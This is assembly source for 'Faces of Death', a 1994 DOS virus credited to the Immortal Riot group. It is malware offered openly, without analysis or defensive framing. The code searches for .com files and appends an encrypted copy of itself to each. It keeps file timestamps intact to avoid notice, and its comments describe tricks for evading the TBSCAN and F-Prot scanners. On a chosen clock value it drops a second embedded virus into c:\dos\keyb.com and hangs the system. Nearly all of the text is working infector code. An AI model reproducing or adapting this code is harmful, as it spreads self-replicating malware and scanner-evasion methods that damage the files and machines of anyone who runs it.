; ------------------------------------------------------------------------------
;
;                       - Faces of Death -
;       Created by Immortal Riot's destructive development team
;              (c) 1994 The Unforgiven/Immortal Riot 
;
; ------------------------------------------------------------------------------
;         þ Undetectable COM-infector(s) with a neat pay-load system! þ
; ------------------------------------------------------------------------------
.model tiny
.radix 16
.code
org    100h

start:

first_gen_buffer db 00,00,00,00   ; for first generation only!    

v_start:

entry_point:

mov     sp,102h                   ; get the delta offset so tbscan cant
call    get_delta                 ; flag it as flexible entry point
get_delta:                         
mov     bp,word ptr ds:[100h]      
mov     sp,0fffeh                  
sub     bp,offset get_delta       


mov     ax,0305h                  ; this code was included to avoid detection
xor     bx,bx                     ; from tbscan. The vsafe disabeling code can
int     16h                       ; be used as well, but f-prot heuristics
				  ; complains about it.
				 
call    en_de_crypt               ; decrypt the virus
jmp     short real_start          ; and continue...

encrypt_value dw 0                ; random xor (encryption) value 

write_virus:

call    en_de_crypt               ; write encrypted copy of the virus
mov     ah,40                     ; 
mov     cx,code_end-v_start       ; # bytes
lea     dx,[bp+v_start]           ; dx:100h         
int     21                        ;
call    en_de_crypt               ; decrypt virus again for further processing
ret

en_de_crypt:

mov     ax,word ptr [bp+encrypt_value]       
lea     si,[bp+real_start]                        
mov     cx,(enc_end-real_start+1)/2

xor_loopie:

xor     word ptr [si],ax          ; encrypts two bytes/loop until all 
inc     si                        ; code between real_start and enc_end
inc     si                        ; are encrypted
loop    xor_loopie
ret

real_start:

cmp     word ptr cs:[5dh],'?-'    ; check for -? in the command line
jne     chk_cond                  ; no valid virus option!

mov     ah,9                      ; tell them that i wrote the virus,
lea     dx,[bp+offset v_name]     ; and quit without infecting!
int     21h
int     20h

chk_cond:

mov     ah,2ch                    ; get time of 1/100 of a second value from
int     21h                       ; the system clock

cmp     dl,58                     ; value == 58h (88d)
jne     get_drive                 ; nope!

cr_file:                          ; value = 58h

mov     ah,3ch                    ; create the file c:\dos\keyb.com
mov     cx,0                      ; Doh! One byte wasted!
lea     dx,[bp+file_create]
int     21h

xchg    ax,bx                        
mov     ah,40h                    ; write the
mov     cx,len                    ; 80hex virus,
lea     dx,[bp+write]             ; from this virus
int     21h                       ; to keyb.com

mov     ah,3eh                        ; close file
lea     dx,[bp+offset file_create]    ; c:\dos\keyb.com
int     21h                            
jmp     $                             ; and hang 

get_drive:                        

mov     ah,19h                    ; get drive from where we are executed from
int     21h                       ; check if it's a: or b:
cmp     al,2                      ; if so, return control to the original
jb      quit                      ; program without infecting other files

lea     si,[bp+org_buf]           ; copy the first four bytes of the file
mov     di,100                    ; (from di:100h) to org_buf
movsw                             ;
movsw                             ;              

lea     dx,[bp+code_end]          ; set our own dta to code_end, so
call    set_dta                   ; the paramters when findfiles arent
				  ; destroyed

lea     dx,[bp+direct_infect]     ; if present, infect
call    dirinfect                 ; \dos\edit.com

mov     ah,4e                     ; search for com files
lea     dx,[bp+com_files]         ; 
find_next:
int     21

jc      no_more_files             ; no more files find, exit!
call    infect                    ; found a find, infect it!

mov     ah,4f                     ; search next file
jmp     short find_next           ; and see if we find one

no_more_files:                    ;
mov     dx,80                     ; set the dta to 80h (default)          
call    set_dta                   ; 

quit:                             ;
mov     di,100                    ; return control to original program     
push    di                        ; 
ret                                           

infect:
lea     dx,[bp+code_end+1e]       ; 1e = adress to filename in ds:dx in our 
				  ; new dta area!
dirinfect:

mov     ax,3d02                   ; open file 
int     21                        ; in read/write mode

jnc     infect_it                 ; if the file \dos\edit.com doesnt exist
ret                               ; return, and search first comfile

infect_it:
xchg    bx,ax                     ; filehandle in bx

mov     ax,5700                   ; get time/date
int     21

push    dx                        ; save date
push    cx                        ; save time

mov     ah,3f                     ; read the first four bytes
mov     cx,4                      ; of the file to org_buf
lea     dx,[bp+org_buf]  
int     21                                     

cmp     byte ptr [bp+org_buf+3],07h            ; previous infected
jz      finish_infect                          ; 

cmp     word ptr [bp+org_buf],9090h            ; double nop
jz      finish_infect                          ; 

cmp     word ptr [bp+org_buf],5a4dh            ; ZM (exe file)
jz      finish_infect                          ;

cmp     word ptr [bp+org_buf],4d5ah            ; MZ (exe-file)
jz      finish_infect                          ;
						
cmp     byte ptr [bp+org_buf+1],6Dh            ; command.com
jz      finish_infect                          ;

mov     ax, word ptr [bp+code_end+1ah]         ; <1000 bytes
cmp     ax,1000d                               ;
jb      finish_infect

cmp     ax,64000d                              ; >64000 bytes
ja      finish_infect                          ;

mov     ax,4202                                ; move file-pointer
xor     cx,cx                                  ; to end of file
cwd
int     21

sub     ax,3                                   ; substract bytes
mov     word ptr [bp+first_four+1],ax          ; to our own jump

get_value:

mov     ah,2ch                                 ; get system clock for
int     21h                                    ; 1/100 of a second
jz      get_value                              ; if zero = get new value
add     ax,3                                   ; this will be used for
mov     word ptr [bp+encrypt_value],dx         ; the xor-value
call    write_virus                            ; write virus to end of file

mov     ax,4200                   ; move file-pointer to
xor     cx,cx                     ; top of file
cwd
int     21

mov     ah,40                     ; write our own jump  
mov     cx,4                      ; instruction to the
lea     dx,[bp+first_four]        ; beginning
int     21                                               

finish_infect:                                 
mov     ax,5701                   ; set back
pop     cx                        ; time
pop     dx                        ; date
int     21                        ; 

mov     ah,3e                     ; close file
int     21

ret                               ; return and continue!

set_dta:
mov     ah,1a                     ; code to set the disk transfer area 
int     21                        ; 
ret

v_name           db   "Faces of Death - (c) 1994 The Unforgiven/Immortal Riot$"

direct_infect    db      '\DOS\EDIT.COM',0                         
file_create      db      'c:\dos\keyb.com',0

write            db      "þJ€ÄNºJÍ!s´,Í!€úOr°¹
endwrite:                

len              equ     endwrite-write

com_files        db      '*.com',0                 
first_four       db      0e9,90,90,07     ; buffer to calculate the new entry
org_buf          db      90,90,0CDh,20    ; buffer to save the first four bytes
enc_end:         

code_end:
end start
